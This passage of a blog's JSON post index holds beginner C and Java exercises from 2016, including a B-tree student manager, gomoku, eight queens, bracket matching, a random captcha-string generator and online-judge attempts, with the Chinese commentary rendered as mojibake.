printf(&quot;\\n\\t\\t\\tdel success&quot;); break; case 3: printf(&quot;\\n\\t\\t\\tplease input the studentId you want modify:&quot;); scanf(&quot;%d&quot;,&amp;studentId); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit&quot;); break; } printf(&quot;\\n\\t\\t\\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); printf(&quot;\\n\\t\\t\\tplease input the new name:&quot;); scanf(&quot;%s&quot;,stu-&gt;info-&gt;name); printf(&quot;\\n\\t\\t\\tmodify success!&quot;); break; case 4: printf(&quot;\\n\\t\\t\\tplease input the studentId you want search:&quot;); scanf(&quot;%d&quot;,&amp;studentId); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit!&quot;); break; } printf(&quot;\\n\\t\\t\\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); break; case 5: for(int i=0;i&lt;1000;i++){ if(a[i]!=0){ stu=getnode(root,i); printf(&quot;\\n\\t\\t\\tid: %d ,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name); } } break; } } return 0; }","categories":[],"tags":[{"name":"å®è®­","slug":"å®è®­","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"},{"name":"å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ","slug":"å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ","permalink":"http://yoursite.com/tags/%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"Bæ ‘","slug":"Bæ ‘","permalink":"http://yoursite.com/tags/B%E6%A0%91/"}]},{"title":"ç‚®å¼¹æ‹¦æˆª","slug":"ç‚®å¼¹æ‹¦æˆª","date":"2016-10-12T10:28:36.000Z","updated":"2020-11-14T17:12:05.918Z","comments":true,"path":"2016/10/12/ç‚®å¼¹æ‹¦æˆª/","link":"","permalink":"http://yoursite.com/2016/10/12/%E7%82%AE%E5%BC%B9%E6%8B%A6%E6%88%AA/","excerpt":"","text":"#include &lt;stdio.h&gt; int main() { int N,m; int i,j,preMax,maxNum; int fire[20]; int test[20]; scanf(&quot;%d&quot;,&amp;N); while(N--){ scanf(&quot;%d&quot;,&amp;m); for(i=0;i&lt;m;i++){ scanf(&quot;%d&quot;,&amp;fire[i]); test[i]=1; preMax=0; for(j=0;j&lt;i;j++){ if(fire[j]&gt;fire[i]) preMax=(preMax&gt;test[j]?preMax:test[j]); } test[i]=preMax+test[i]; } maxNum=1; for(i=0;i&lt;m;i++) if(maxNum&lt;test[i]) maxNum=test[i]; printf(&quot;%d\\n&quot;,maxNum); } return 0; } ç®€å•çš„åŠ¨æ€è§„åˆ’","categories":[],"tags":[]},{"title":"è´ªåƒè›‡å¤§ä½œæˆ˜","slug":"è´ªåƒè›‡å¤§ä½œæˆ˜","date":"2016-09-27T12:19:15.000Z","updated":"2020-11-14T17:12:06.370Z","comments":true,"path":"2016/09/27/è´ªåƒè›‡å¤§ä½œæˆ˜/","link":"","permalink":"http://yoursite.com/2016/09/27/%E8%B4%AA%E5%90%83%E8%9B%87%E5%A4%A7%E4%BD%9C%E6%88%98/","excerpt":"","text":"å†™äº†å¤§æ¦‚æœ‰ä¸€ä¸ªæ˜ŸæœŸçš„è´ªåƒè›‡ï¼Œæœ€åå´©ç›˜äº†ï¼Œæ²¡æœ‰å†™æˆåŠŸä¹Ÿè®¸æ˜¯ä¸ªé”™è¯¯çš„æ„æ€ï¼Œç”¨çš„äºŒç»´intæ•°ç»„åšçš„ï¼Œå†™åˆ°æœ€åä¸€æ­¥çš„æ—¶å€™ï¼Œå·²ç»å®ç°çš„åŠŸèƒ½æ˜¯åœ¨è›‡å±å¹•ä¸Šç§»åŠ¨ï¼Œè¿˜æœ‰åˆ¤æ–­game over ï¼Œè¿˜æœ‰éšæœºäº§ç”Ÿæœå® åœ¨å†™è´ªåƒè›‡çš„è¿‡ç¨‹ä¸­ï¼Œå­¦åˆ°äº†ä¸å°‘ï¼Œ kbhitï¼ˆï¼‰åˆ¤æ–­æ˜¯å¦æœ‰é”®å…¥ï¼Œæ²¡æœ‰è¿”å›0ï¼Œelse return é0ï¼› #include #include&lt;stdio.h&gt; #include&lt;conio.h&gt; #include&lt;stdlib.h&gt; int main(void) { char ch; while(ch!=27) { printf(&quot;HelloWorld\\n&quot;); if(kbhit()) ch=getch(); } printf(&quot;End!\\n&quot;); system(&quot;pause&quot;); return 0; } getch()å’Œgetcharï¼ˆ)æ˜¯æœ‰åŒºåˆ«çš„getchar();éœ€è¦enteré”®ï¼Œgetch();å¹¶ä¸éœ€è¦ éšæœº #include &lt;time.h&gt; time_t t; srand((unsigned)time(&amp;t)); int randomNum=rand()%k+1; è´ªåƒè›‡åœ°å›¾ #include &lt;stdio.h&gt; #include &lt;conio.h&gt; #include &lt;windows.h&gt; int main(){ int width = 30, height = width; //å®½åº¦å’Œé«˜åº¦ int x, y; //xã€yåˆ†åˆ«è¡¨ç¤ºå½“å‰è¡Œå’Œåˆ— HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); //è®¾ç½®çª—å£å¤§å° system(&quot;mode con: cols=64 lines=32&quot;); //æ‰“å°èƒŒæ™¯ï¼ŒæŒ‰è¡Œè¾“å‡º for(x=0; x&lt;width; x++){ for(y=0; y&lt;height; y++){ if(y==0 || y==width-1 || x==0 || x==height-1){ //è¾“å‡ºè¾¹æ¡† SetConsoleTextAttribute(hConsole, 4 ); printf(&quot;â–¡&quot;); }else{ //è´ªåƒè›‡æ´»åŠ¨åŒºåŸŸ SetConsoleTextAttribute(hConsole, 2 ); printf(&quot;â– &quot;); } } printf(&quot;\\n&quot;); } //æš‚åœ getch(); return 0; }//http://c.biancheng.net/cpp/html/2942.htmlä¸‹æ¬¡å†å¼€è½¦","categories":[],"tags":[{"name":"æ¸¸æˆ","slug":"æ¸¸æˆ","permalink":"http://yoursite.com/tags/%E6%B8%B8%E6%88%8F/"}]},{"title":"æŠ•å…¥linuxæ€€æŠ±ï¼Œæ‹œæ‹œwin","slug":"æŠ•å…¥linuxæ€€æŠ±ï¼Œæ‹œæ‹œwin","date":"2016-09-15T07:49:13.000Z","updated":"2020-11-14T17:12:06.851Z","comments":true,"path":"2016/09/15/æŠ•å…¥linuxæ€€æŠ±ï¼Œæ‹œæ‹œwin/","link":"","permalink":"http://yoursite.com/2016/09/15/%E6%8A%95%E5%85%A5linux%E6%80%80%E6%8A%B1%EF%BC%8C%E6%8B%9C%E6%8B%9Cwin/","excerpt":"","text":"æ˜¨å¤©ä¸‹åˆè£…äº†ubuntu16.04ï¼Œç‰¹åˆ«å¥½ç©ï¼Œå›¾åƒç•Œé¢å¾ˆèµå“¦ï¼Œ ç°åœ¨èº«è¾¹3äººåœ¨ç”¨linuxçš„ï¼Œ æœ€å¤§çš„æ„Ÿè§‰å°±æ˜¯ï¼Œeclipseè¿è¡Œå¥½å¿«ï¼Œå“ˆå“ˆ ä¸‹äº†Sublime Text3ï¼Œæœ€çˆ±çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œmonokaiçš„é…è‰²æœ€çˆ± è¿˜æœ‰ç½‘æ˜“äº‘éŸ³ä¹ï¼Œæœ‰linuxç‰ˆæœ¬çš„ æœç‹—for linux ä»¥å‰ä¹ æƒ¯ç”¨chromeæµè§ˆå™¨ï¼Œç°åœ¨åªèƒ½ç”¨ä»–çš„chromiumæµè§ˆå™¨ï¼Œè¿˜ä¸é”™å‡ ä¹ä¸€æ · firefoxä¹Ÿä¸é”™ æœ€å¥½ç©çš„å°±æ˜¯ç”¨ï¼Œqq2012å›½é™…ç‰ˆçš„ï¼Œæ„Ÿè§‰å›åˆ°äº†å‡ åå¹´å‰","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"äº”å­æ£‹","slug":"äº”å­æ£‹","date":"2016-09-13T11:45:23.000Z","updated":"2020-11-14T17:12:07.856Z","comments":true,"path":"2016/09/13/äº”å­æ£‹/","link":"","permalink":"http://yoursite.com/2016/09/13/%E4%BA%94%E5%AD%90%E6%A3%8B/","excerpt":"","text":"è€—æ—¶4å°æ—¶å†™æˆ ä¹‹å‰ï¼Œå¯¹äºè¿™ä¸ªäº”å­æ£‹è¿™ç§ï¼Œåœ¨æˆ‘çœ‹æ¥æ˜¯ä¸€ç§æ¯”è¾ƒç®€å•æ¸¸æˆï¼Œä½†æ˜¯ï¼Œå¦‚ä½•æ˜¾ç¤ºï¼Œæˆ‘è§è¿‡çš„äº”å­æ£‹ï¼Œå°±æ˜¯qqæ¸¸æˆé‡Œé¢çš„äº”å­æ£‹ åæ¥ï¼Œçœ‹åˆ°ä¹¦ä¸Šå››å­è¿é¢˜ç›®å†™äº†ï¼Œ ** è¿™å¥è¯ï¼Œå½“æ”¾ä¸‹ä¸€é¢—å­æ—¶ï¼Œç¨‹åºåœ¨æ§åˆ¶å°é‡æ–°æ˜¾ç¤ºè¯¥æ£‹ç›˜ï¼Œèµ·åˆä»¥ä¸ºsystem(â€œclsâ€);ä¹‹åæ‰“å°æ£‹ç›˜ï¼Œä¼šé€ æˆå±å¹•ä¸Šå­˜åœ¨è§†è§‰åœç•™ï¼Œå…¶å®å¹¶æ²¡æœ‰ ** #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #define MAX 10 int a[MAX][MAX]; int isOut(int i,int j)//æ˜¯å¦è¶Šç•Œ { if(i&lt;0||i&gt;9||j&lt;0||j&gt;9) return 0;//out return 1;//in } void print()//åº”ç”¨äºæ‰“å°æ£‹ç›˜ { int i,j; printf(&quot;p1ç©å®¶%c\\n&quot;,1); printf(&quot;p2ç©å®¶%c\\n&quot;,2); printf(&quot; &quot;); for(i=0;i&lt;10;i++) printf(&quot;%d &quot;,i); printf(&quot;\\n&quot;); for(i=0;i&lt;10;i++) { printf(&quot;%d &quot;,i); for(j=0;j&lt;10;j++) if(a[i][j]==0) printf(&quot;. &quot;); else if(a[i][j]==1) printf(&quot;%c &quot;,1); else printf(&quot;%c &quot;,2); printf(&quot;\\n&quot;); } } void testRight(int i,int j,int flag) { int m,n,sum,row,col; for(m=i-4,n=j-4;m&lt;=i,n&lt;=j;m++,n++) { sum=0; if(isOut(m,n)==0) continue; for(row=m,col=n;sum&lt;=5;row++,col++) if(a[row][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testUpToDown(int i,int j,int flag) { int m,sum,row; for(m=i-4;m&lt;=i;m++) { sum=0; if(isOut(m,j)==0) continue; for(row=m;sum&lt;=5;row++) if(a[row][j]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testLeft(int i,int j,int flag) { int m,n,sum,row,col; for(m=i-4,n=j+4;m&lt;=i;m++,n--) { sum=0; if(isOut(m,n)==0) continue; for(row=m,col=n;sum&lt;=5;row++,col--) if(a[row][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testLeftToRight(int i,int j,int flag) { int n,sum,col; for(n=j-4;n&lt;=j;n++) { sum=0; if(isOut(i,n)==0) continue; for(col=n;sum&lt;=5;col++) if(a[i][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void test(int i,int j,int flag)//å¯¹æ£‹å­æ—¶å€™5è¿æµ‹è¯• { if(a[i-1][j-1]==flag||a[i+1][j+1]==flag)//è¿™æ˜¯å¯¹å³å¯¹è§’çº¿çš„åˆ¤æ–­ testRight(i,j,flag); if(a[i-1][j]==flag||a[i+1][j]==flag)//è¿™æ˜¯å¯¹ä¸Šä¸‹çš„åˆ¤æ–­ testUpToDown(i,j,flag); if(a[i-1][j+1]==flag||a[i+1][j-1]==flag)//è¿™æ˜¯å¯¹å·¦å¯¹è§’çº¿çš„åˆ¤æ–­ testLeft(i,j,flag); if(a[i][j-1]==flag||a[i][j+1]==flag)//è¿™æ˜¯å¯¹å·¦å³åˆ¤æ–­ testLeftToRight(i,j,flag); } int main()//æœ¬åœºæ¯”èµ›ä¸­ï¼Œp1ç©å®¶ç”¨printf(&quot;%c &quot;,1);p2ç©å®¶ç”¨printf(&quot;%c &quot;,2); { //åˆå§‹åŒ–æ£‹ç›˜ int total=0,flag;//totalä½œä¸ºè®¡ç®—æ˜¯å¦å¹³å±€ä»¥åŠæ‰“å°æ—¶é€šè¿‡%2ï¼Œå­˜å…¥aæ•°ç»„ä¸­1å’Œ2ï¼Œå’Œæ‰“å°åœ¨æ˜¾ç¤ºå™¨ä¸Šä¸åŒæ£‹å­ int i,j; memset(a,0,sizeof(a)/sizeof(int));//stringç±»æ–¹æ³•å¡«å……aæ•°ç»„ system(&quot;color 2f&quot;);//æ§åˆ¶å°é¢œè‰² print();//æ‰“å°æ£‹ç›˜ while(1)//å¼€å§‹ä¸‹æ£‹ { if(total==100) { printf(&quot;Game Draw\\n&quot;);//å¹³å±€ break; } printf(&quot;%cp%d please\\n&quot;,total%2+1,total%2+1); flag=total%2+1; scanf(&quot;%d%d&quot;,&amp;i,&amp;j); while(i&lt;0||i&gt;9||j&lt;0||j&gt;9||a[i][j]!=0) { printf(&quot;è¾“å…¥ä½ç½®ä¸åˆæ³•,è¯·é‡æ–°è¾“å…¥\\n&quot;); scanf(&quot;%d%d&quot;,&amp;i,&amp;j); } a[i][j]=flag; system(&quot;cls&quot;); printf(&quot;%cp%d pre put at [%d] [%d]\\n&quot;,flag,flag,i,j);//æ‰“å°ä¹‹å‰ä¸€ä¸ªäººä¸‹çš„ä½ç½® print(); test(i,j,flag); total++; } return 0; }","categories":[],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"äº”å­æ£‹","slug":"äº”å­æ£‹","permalink":"http://yoursite.com/tags/%E4%BA%94%E5%AD%90%E6%A3%8B/"}]},{"title":"å…«çš‡å","slug":"å…«çš‡å","date":"2016-09-11T06:36:29.000Z","updated":"2020-11-14T17:12:08.416Z","comments":true,"path":"2016/09/11/å…«çš‡å/","link":"","permalink":"http://yoursite.com/2016/09/11/%E5%85%AB%E7%9A%87%E5%90%8E/","excerpt":"","text":"ç»ˆäºå†™å®Œäº†ï¼Œå¬è¯´æœ‰92ç§æ’åºæ–¹å¼ï¼Œçœ‹äº†ä¸å°‘åšå®¢ï¼Œçœ‹åˆ°è¿™å¥è¯ï¼Œçœ‹åˆ«äººä»£ç ç™¾éï¼Œä¸å¦‚è‡ªå·±å†™ä¸€éï¼Œç„¶åçœ‹åˆ«äººä»£ç ï¼Œå¤ªç®€æ´ï¼Œæ²¡çœ‹æ‡‚ï¼Œè¿˜æ˜¯è‡ªå·±å†™ å†™äº†å¥½ä¹…ï¼Œç»ˆäºæˆåŠŸäº†ï¼Œè®°å¾—åŠ æ²¹ï¼Œä¸‹é¢è¿™ä¸ªå›¾å¾ˆé­”æ€§ï¼Œå†™å¡äº†çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹çœ‹å›¾ï¼Œç»§ç»­å†™ #include &lt;stdio.h&gt; int queen[9]; void print()//æ‰“å° { int i,j; for(i=1;i&lt;=8;i++) { for(j=1;j&lt;=8;j++) if(queen[i]==j) printf(&quot;%c &quot;,2);//æ‰“å°è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘æ˜¯æ¨¡ä»¿åˆ«äººçš„æ‰“å°æ–¹å¼ï¼Œæ‰“å°å‡ºæ¥ï¼Œè¿˜æ˜¯è›®ä¸é”™çš„ï¼Œè›®äººæ€§åŒ–çš„ else printf(&quot;. &quot;); printf(&quot;\\n&quot;); } } int check(int i)//åˆ¤æ–­æ—¶å€™åˆæ³• { int j; for(j=1;j&lt;i;j++) if(queen[j]==queen[i]||queen[j]-queen[i]==j-i||queen[j]-queen[i]==i-j) return 0; return 1; } int next(int i)//è·å¾—ä¸‹ä¸€è¡Œåˆæ³•ä½ç½® { int j; for(j=1;j&lt;=8;j++) { queen[i]=j; if(check(i)==1) { return j; } } return 0; } int replace(int i)//åœ¨å½“å‰è¡Œå¯»æ‰¾é™¤å»queen[i]ï¼Œä¹Ÿå°±æ˜¯queen[i]+1~8ä¹‹é—´çš„å¯é€‰ä½ç½® { int j; if(queen[i]==8) return 0; for(j=queen[i]+1;j&lt;=8;j++) { queen[i]=j; if(check(i)==1) return i; } return 0; } void Try(int i,int value) { queen[i]=value; if(i==8) { print(); return; } /* int m,n; for(m=1;m&lt;=8;m++) { for(n=1;n&lt;=8;n++) if(queen[m]==n) printf(&quot;* &quot;); else printf(&quot;0 &quot;); printf(&quot;\\n&quot;); }*/ if(next(i+1)==0)//ä¸‹ä¸€è¡Œæ²¡æœ‰åˆæ³•ä½ç½® { while(replace(i)==0)//å½“å‰è¡Œä¹Ÿæ— åˆæ³•ä½ç½®ï¼Œåˆ™ç»§ç»­å¾ªç¯ä¸Šä¸€ä¸ªåˆç†ä½ç½®//æ„Ÿè§‰è¿™ä¸ªåœ°æ–¹ï¼Œæ˜¯æœ€åæ‰æƒ³å¥½çš„ï¼Œæ„Ÿè§‰å¾ˆé‡è¦ { i--; replace(i); } Try(i,queen[i]); } else//ä¸‹ä¸€è¡Œå­˜åœ¨åˆæ³•ä½ç½® Try(i+1,next(i+1)); } int main() { int i; for(i=1;i&lt;=8;i++) queen[i]=0; Try(1,1); return 0; }è¿™åªæ˜¯ç¬¬ä¸€ç§ï¼Œä»¥åå†æ›´æ–°92ç§ -â€”â€”â€”â€”â€”â€”â€”â€”â€”- æ¥ä¸ªæš´åŠ›çš„ï¼Œè™½ç„¶ä¸å¥½ï¼Œä½†æ˜¯ä»–è¿™ç§å¾ˆè½»ä¾¿ void put(int n){int i;for(i=1;i&lt;MAX;i++){s[n]=i;if(check(n)){if(n==MAX-1)result();elseput(n+1);}}}","categories":[],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"å›æº¯","slug":"å›æº¯","permalink":"http://yoursite.com/tags/%E5%9B%9E%E6%BA%AF/"}]},{"title":"nyoj4614æ‹¬å·åŒ¹é…","slug":"nyoj4614æ‹¬å·åŒ¹é…","date":"2016-09-07T04:13:18.000Z","updated":"2020-11-14T17:12:08.926Z","comments":true,"path":"2016/09/07/nyoj4614æ‹¬å·åŒ¹é…/","link":"","permalink":"http://yoursite.com/2016/09/07/nyoj4614%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/","excerpt":"","text":"import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args) { Scanner input=new Scanner(System.in); int testNum=input.nextInt(); out:while(testNum--!=0){ String str=input.next(); Stack&lt;Character&gt; stack=new Stack&lt;Character&gt;(); if(str.length()%2!=0||str.charAt(0)==&apos;]&apos;||str.charAt(0)==&apos;)&apos;){ System.out.println(&quot;No&quot;); continue out; } for(int i=0;i&lt;str.length();i++){ if(str.charAt(i)==&apos;(&apos;||str.charAt(i)==&apos;[&apos;) stack.push(str.charAt(i)); else if((stack.isEmpty())||!match(stack.pop(),str.charAt(i))){ System.out.println(&quot;No&quot;); continue out; } } System.out.println(&quot;Yes&quot;); } input.close(); } public static boolean match(Character ch1,char ch2){ return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;); } }è¿™ä¸ªæ˜¯æ¨¡ä»¿åˆ«äººçš„ä»£ç ï¼Œä¸‹é¢æ–°å­¦ä¼šçš„ import java.util.Stack; out: continue out;//å†™çš„outï¼Œç›´æ¥è·³å‡ºåˆ°outå¤„ Stack&lt;Character&gt; stack=new Stack&lt;Character&gt;(); input.close(); public static boolean match(Character ch1,char ch2){ return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;); }","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"éªŒè¯ç ç”Ÿæˆ","slug":"éªŒè¯ç ç”Ÿæˆ","date":"2016-09-06T11:53:25.000Z","updated":"2020-11-14T17:12:09.463Z","comments":true,"path":"2016/09/06/éªŒè¯ç ç”Ÿæˆ/","link":"","permalink":"http://yoursite.com/2016/09/06/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%9F%E6%88%90/","excerpt":"","text":"import java.util.Scanner; public class Main { public static void main(String[] args) { String randomCode=&quot;&quot;; System.out.println(&quot;è¯·è¾“å…¥ä½ ç”Ÿæˆå‡ ä½éªŒè¯ç &quot;); Scanner input=new Scanner(System.in); int n=input.nextInt(); for(int i=0;i&lt;n;i++){ int random=(int)(Math.random()*3+1); if(random==1) randomCode=randomCode+getRandomLowerCaseLetter(); else if(random==2) randomCode=randomCode+getRandomUpperCaseLetter(); else randomCode=randomCode+getRandomDigitCharacter(); } System.out.println(randomCode); } public static char getRandomCharacter(char ch1,char ch2){ return (char)(ch1+Math.random()*(ch2-ch1+1)); } public static char getRandomLowerCaseLetter(){ return getRandomCharacter(&apos;a&apos;,&apos;z&apos;); } public static char getRandomUpperCaseLetter(){ return getRandomCharacter(&apos;A&apos;,&apos;Z&apos;); } public static char getRandomDigitCharacter(){ return getRandomCharacter(&apos;0&apos;,&apos;9&apos;); } }ä¹‹å‰åœ¨è§†é¢‘ä¸Šçœ‹è¿‡ï¼Œå½“æ—¶ç¬¬ä¸€æ¬¡çœ‹è§ï¼Œæ„Ÿè§‰å¾ˆå¥‡å¦™ï¼Œç°åœ¨è‡ªå·±å†™èµ·æ¥ï¼Œä¹Ÿè¿˜è›®æœ‰æˆå°±æ„Ÿçš„ï¼Œè¿™ä¸ªä»£ç ï¼ŒåŠŸèƒ½å°±æ˜¯ï¼Œä½ è¾“å…¥ä¸€ä¸ªä½ æƒ³ç”Ÿæˆå‡ ä½çš„éªŒè¯ç çš„ä¸ªæ•°ï¼Œç„¶åï¼Œè¾“å‡ºå‡ ä½éªŒè¯ç ","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"nyoj4632åå•¬çš„å›½åº¦","slug":"nyoj4632åå•¬çš„å›½åº¦","date":"2016-09-06T09:13:20.000Z","updated":"2020-11-14T17:12:09.972Z","comments":true,"path":"2016/09/06/nyoj4632åå•¬çš„å›½åº¦/","link":"","permalink":"http://yoursite.com/2016/09/06/nyoj4632%E5%90%9D%E5%95%AC%E7%9A%84%E5%9B%BD%E5%BA%A6/","excerpt":"","text":"é¢˜ç›®æè¿° åœ¨ä¸€ä¸ªåå•¬çš„å›½åº¦é‡Œæœ‰Nä¸ªåŸå¸‚ï¼Œè¿™Nä¸ªåŸå¸‚é—´åªæœ‰N-1æ¡è·¯æŠŠè¿™ä¸ªNä¸ªåŸå¸‚è¿æ¥èµ·æ¥ã€‚ç°åœ¨ï¼ŒTomåœ¨ç¬¬Så·åŸå¸‚ï¼Œä»–æœ‰å¼ è¯¥å›½åœ°å›¾ï¼Œä»–æƒ³çŸ¥é“å¦‚æœè‡ªå·±è¦å»å‚è§‚ç¬¬Tå·åŸå¸‚ï¼Œå¿…é¡»ç»è¿‡çš„å‰ä¸€ä¸ªåŸå¸‚æ˜¯å‡ å·åŸå¸‚ï¼ˆå‡è®¾ä½ ä¸èµ°é‡å¤çš„è·¯ï¼‰ã€‚ è¾“å…¥ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•´æ•°Mè¡¨ç¤ºæµ‹è¯•æ•°æ®å…±æœ‰M(1&lt;=M&lt;=5)ç»„æ¯ç»„æµ‹è¯•æ•°æ®çš„ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°N(1&lt;=N&lt;=100000)å’Œä¸€ä¸ªæ­£æ•´æ•°S(1&lt;=S&lt;=100000)ï¼ŒNè¡¨ç¤ºåŸå¸‚çš„æ€»ä¸ªæ•°ï¼ŒSè¡¨ç¤ºå‚è§‚è€…æ‰€åœ¨åŸå¸‚çš„ç¼–å·éšåçš„N-1è¡Œï¼Œæ¯è¡Œæœ‰ä¸¤ä¸ªæ­£æ•´æ•°a,b(1&lt;=a,b&lt;=N)ï¼Œè¡¨ç¤ºç¬¬aå·åŸå¸‚å’Œç¬¬bå·åŸå¸‚ä¹‹é—´æœ‰ä¸€æ¡è·¯è¿é€šã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•æ•°æ®è¾“Nä¸ªæ­£æ•´æ•°ï¼Œå…¶ä¸­ï¼Œç¬¬iä¸ªæ•°è¡¨ç¤ºä»Sèµ°åˆ°iå·åŸå¸‚ï¼Œå¿…é¡»è¦ç»è¿‡çš„ä¸Šä¸€ä¸ªåŸå¸‚çš„ç¼–å·ã€‚ï¼ˆå…¶ä¸­i=Sæ—¶ï¼Œè¯·è¾“å‡º-1ï¼‰ï¼ˆæ¯ç»„ä¸€è¡Œï¼Œè¡Œæœ«æœ‰ç©ºæ ¼ï¼‰ æ ·ä¾‹è¾“å…¥110 11 91 88 1010 38 61 210 49 53 7 æ ·ä¾‹è¾“å‡º-1 1 10 10 9 8 3 1 1 8ä¸‹é¢æ˜¯è‡ªå·±å†™çš„ï¼Œä½†æ˜¯ä¸æ˜¯æ­£ç‰ˆçš„ï¼Œåªæ˜¯å‡­è‡ªå·±æ„Ÿè§‰å†™çš„dpsï¼Œæ™šä¸Šåœ¨ç³»ç»Ÿçš„è®¤çœŸå­¦ä¹ ä¸€ä¸‹dpsæ”¹è¿›å‰çš„ä»£ç ï¼ˆæ²¡è¿‡ï¼Œæ€»æ˜¯è¶…æ—¶ï¼‰ #include &lt;stdio.h&gt; #include &lt;string.h&gt; int city[10000][10000]; void dps(int toCity,int num,int myCity) { int i,j; for(i=1;i&lt;=num;i++) if(city[myCity][toCity]==1) { printf(&quot;%d &quot;,myCity); break; } else if(city[myCity][i]==1) { city[myCity][i]=2; city[i][myCity]=2; dps(toCity,num,i); } } int main() { int m; int num,myCity; int i,j,n; scanf(&quot;%d&quot;,&amp;m); while(m--) { scanf(&quot;%d%d&quot;,&amp;num,&amp;myCity); memset(city,0,num+1); int row,col; for(i=1;i&lt;num;i++) { scanf(&quot;%d%d&quot;,&amp;row,&amp;col); city[row][col]=1; city[col][row]=1; } for(i=1;i&lt;=num;i++) { if(i==myCity) { printf(&quot;-1 &quot;); continue; } else { for(n=1;n&lt;=num;n++) for(j=n;j&lt;=num;j++) if(city[n][j]==2) { city[n][j]=1; city[j][n]=1; } dps(i,num,myCity); } } } return 0; }æ„Ÿè§‰è‡ªå·±ç‹—å¸¦äº†ï¼Œè¿˜æ˜¯æ²¡æ€ä¹ˆè¿‡ï¼Œå†™çš„ï¼Œè¿‡ä¸äº†","categories":[],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://yoursite.com/tags/ACM/"}]},{"title":"ç»Ÿè®¡å•è¯","slug":"ç»Ÿè®¡å•è¯","date":"2016-09-04T05:03:12.000Z","updated":"2020-11-14T17:12:10.460Z","comments":true,"path":"2016/09/04/ç»Ÿè®¡å•è¯/","link":"","permalink":"http://yoursite.com/2016/09/04/%E7%BB%9F%E8%AE%A1%E5%8D%95%E8%AF%8D/","excerpt":"","text":"æ–¹æ³•ä¸€ï¼šScannerä¸­æ–¹æ³•hasNext() /* * é¢˜ç›®å†…å®¹ï¼š ä½ çš„ç¨‹åºè¦è¯»å…¥ä¸€ç¯‡è‹±æ–‡æ–‡ç« ï¼Œç„¶åç»Ÿè®¡å…¶ä¸­çš„å•è¯æ•°æ¥è¾“å‡ºã€‚éœ€è¦ç»Ÿè®¡çš„æ•°æ®ä¸ºï¼š æ€»çš„å•è¯æ•°é‡ï¼› å«æœ‰1ä¸ªå­—æ¯åˆ°10ä¸ªå­—æ¯çš„å•è¯çš„æ•°é‡ã€‚ å•è¯å’Œå•è¯çš„é—´éš”æ˜¯ç”±å„ç§ç©ºæ ¼ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€tabå’Œå›è½¦æ¢è¡Œï¼‰å½¢æˆçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œçš„å•è¯ä¸è¯­è¨€æ— å…³ï¼Œå¯ä»¥åŒ…æ‹¬å„ç§ç¬¦å·ï¼Œæ¯”å¦‚â€œit&apos;sâ€ç®—ä¸€ä¸ªå•è¯ï¼Œé•¿åº¦ä¸º4ã€‚æ³¨æ„ï¼Œè¡Œä¸­å¯èƒ½å‡ºç°è¿ç»­çš„ç©ºæ ¼ã€‚é•¿åº¦è¶…è¿‡10ä¸ªå­—æ¯çš„å•è¯éœ€è¦è®¡å…¥æ€»çš„å•è¯æ•°é‡ï¼Œä½†æ˜¯ä¸åšåˆ†ç±»ç»Ÿè®¡ã€‚ å› æ­¤ï¼Œå¯¹äºä¸‹é¢çš„å¥å­ï¼š &quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh. å…¶ä¸­çš„å•è¯å…±14ä¸ªã€‚æ³¨æ„è¿™é‡Œçš„response,&quot;åé¢è·Ÿäº†ç©ºæ ¼ã€‚ è¾“å…¥æ ¼å¼: ä¸€ç¯‡è‹±æ–‡æ–‡ç« ã€‚ è¾“å‡ºæ ¼å¼ï¼š 